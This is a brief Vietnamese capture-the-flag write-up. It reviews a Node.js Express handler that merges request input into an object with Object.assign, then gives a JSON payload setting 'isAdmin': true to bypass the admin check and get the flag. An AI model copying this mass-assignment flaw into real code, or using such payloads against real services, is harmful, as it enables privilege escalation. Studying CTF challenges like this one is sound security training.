# Foobar - Find My Location

Một bài review source code để exploit đơn giản.

Source-code: server.js

```nodejs
app.post('/', (req, res) => {
    console.log(req.body)
    const user = findUser(req.body.auth || {});

    if (!user) {
        res.status(403).send({ ok: false, error: 'Access denied' });
        return;
    }

    const history = {
        icon: '👋',
    };

    Object.assign(history,req.body.location)

    if (history.isAdmin == true) {
        res.status(200).send(myLoaction)

    } else {
        res.status(200).send(history)
    }
})
```

Ta có thể thấy server assign bất cứ giá trị nào từ `req.body.location` thế nên assign thêm `"isAdmin": true` là được flag rồi

**Payload**:
```json
{
  "auth":{"name":"user","password":"pwd"},
  "location":{"name":"123", "isAdmin": true}
}
```

**flag**: Lười mở `burpsuite` quá
